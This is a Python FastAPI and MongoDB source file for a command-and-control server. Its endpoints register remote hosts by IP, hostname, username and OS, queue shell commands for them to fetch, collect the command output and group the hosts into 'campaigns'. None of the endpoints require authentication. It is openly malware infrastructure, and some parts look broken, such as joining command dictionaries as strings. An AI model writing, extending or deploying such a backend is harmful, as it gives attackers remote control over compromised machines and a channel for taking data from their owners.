import datetime
from fastapi import FastAPI, Request, HTTPException
from fastapi.responses import HTMLResponse
from pymongo import MongoClient
from bson.objectid import ObjectId

app = FastAPI()

# Initialize the MongoDB client
client = MongoClient("mongodb://localhost:27017/")
db = client["database"]
connections = db["connections"]
campaigns = db["campaigns"]

# ----------------------------------------------------------------------------------------------
# API endpoints to interact with the command and control service
# list all connections
@app.get('/c2/list-connections')
async def list_connections():
    connection_list = []

    # Query MongoDB for a list of connections
    for connection in connections.find():
        connection['_id'] = str(connection['_id'])
        connection_list.append(connection)

    print("Connection list: " + str(connection_list))

    # Return the list of connections
    return {'connection_list': connection_list}

# get a connection from the database
@app.get('/c2/get-connection/{connection_id}')
async def get_connection(connection_id: str):
    # Retrieve the connection from MongoDB
    connection = connections.find_one({"_id": ObjectId(connection_id)})
    if not connection:
        return HTMLResponse(content="Connection not found", status_code=404)

    # Return the connection
    return {'connection': connection}

# register a new connection
@app.post('/c2/register')
async def register_connection(request: Request):
    data = await request.json()

    # transform the data into a dictionary
    data = dict(data)

    # check if the connection has the required fields
    if 'ip_address' not in data or 'hostname' not in data or 'username' not in data or 'os' not in data:
        raise HTTPException(status_code=400, detail="Missing required fields")
    
    # Add the timestamp to the connection
    data['timestamp'] = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")

    # Insert the connection into MongoDB
    connection_id = connections.insert_one(data).inserted_id

    return {'message': 'Connection registered successfully', 'connection_id': str(connection_id)}

# unregister a connection
@app.delete('/c2/unregister/{connection_id}')
async def unregister_connection(connection_id: str):
    # Delete the connection from MongoDB
    connections.delete_one({"_id": ObjectId(connection_id)})

    return {'message': 'Connection unregistered successfully', 'connection_id': connection_id}

# add a new command to the database
@app.post('/c2/add-command/{connection_id}')
async def add_command(connection_id: str, request: Request):
    data = await request.json()

    # Add the command to the connection's list of commands
    connections.update_one({"_id": ObjectId(connection_id)}, {"$push": {"commands": data}}, upsert=True)

    return {'message': 'Command added successfully', 'connection_id': connection_id}

# return the new commands for the client from the database based on the connection ID
@app.get('/c2/get-commands/{connection_id}')
async def get_commands(connection_id: str):
    # Retrieve the connection from MongoDB
    connection = connections.find_one({"_id": ObjectId(connection_id)})
    if not connection:
        return HTMLResponse(content="Connection not found", status_code=404)

    # edit the commands to be returned to the client in the following format: command1; command2; command3 etc.
    # and only return the commands and not the id or the timestamp
    commands = connection['commands']
    for command in commands:
        command.pop('_id')
    commands = "; ".join(commands)

    # clear the commands from the database
    connections.update_one({"_id": ObjectId(connection_id)}, {"$set": {"commands": []}})

    # Return the connection's list of commands
    return {'commands': commands}

# get a list of all commands for one connection from the database to be displayed in the web interface
@app.get('/c2/get-command-list/{connection_id}')
async def get_command_list(connection_id: str):
    # Retrieve the connection from MongoDB
    connection = connections.find_one({"_id": ObjectId(connection_id)})
    if not connection:
        return HTMLResponse(content="Connection not found", status_code=404)

    commands = connection['commands']

    # Return the connection's list of commands
    return {'commands': commands}

# get the command output for one connection from the database
@app.get('/c2/get-command-output/{connection_id}')
async def get_command_output(connection_id: str):
    # Retrieve the connection from MongoDB
    connection = connections.find_one({"_id": ObjectId(connection_id)})
    if not connection:
        return HTMLResponse(content="Connection not found", status_code=404)

    # Return the connection's command output
    return {'command_output': connection['command_output']}

# add the command output to the database
@app.post('/c2/add-command-output/{connection_id}')
async def add_command_output(connection_id: str, request: Request):
    output = await request.body()
    data = {}
    data['output'] = output

    # Add the timestamp to the command output
    data['timestamp'] = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")

    # Add the command output to the connection's list of command output
    connections.update_one({"_id": ObjectId(connection_id)}, {"$push": {"command_output": data}})

    return {'message': 'Command output added successfully', 'connection_id': connection_id}

# ----------------------------------------------------------------------------------------------
# API endpoints to interact with the campaign management service
# list all campaigns
@app.get('/campaigns/list-campaigns')
async def list_campaigns():
    campaign_list = []

    # Query MongoDB for a list of campaigns
    for campaign in campaigns.find():
        campaign_list.append(campaign)

    # Return the list of campaigns
    return {'campaign_list': campaign_list}

# create a new campaign
@app.post('/campaigns/create')
async def create_campaign(request: Request):
    data = await request.json()

    # Insert the campaign into MongoDB
    campaign_id = campaigns.insert_one(data).inserted_id

    return {'message': 'Campaign created successfully', 'campaign_id': str(campaign_id)}

# delete a campaign
@app.delete('/campaigns/delete/{campaign_id}')
async def delete_campaign(campaign_id: str):
    # Delete the campaign from MongoDB
    campaigns.delete_one({"_id": ObjectId(campaign_id)})

    return {'message': 'Campaign deleted successfully', 'campaign_id': campaign_id}

# get a campaign from the database
@app.get('/campaign/{campaign_id}')
async def get_campaign(campaign_id: str):
    # Retrieve the campaign from MongoDB
    campaign = campaigns.find_one({"_id": ObjectId(campaign_id)})
    if not campaign:
        return HTMLResponse(content="Campaign not found", status_code=404)

    # Return the campaign
    return {'campaign': campaign}
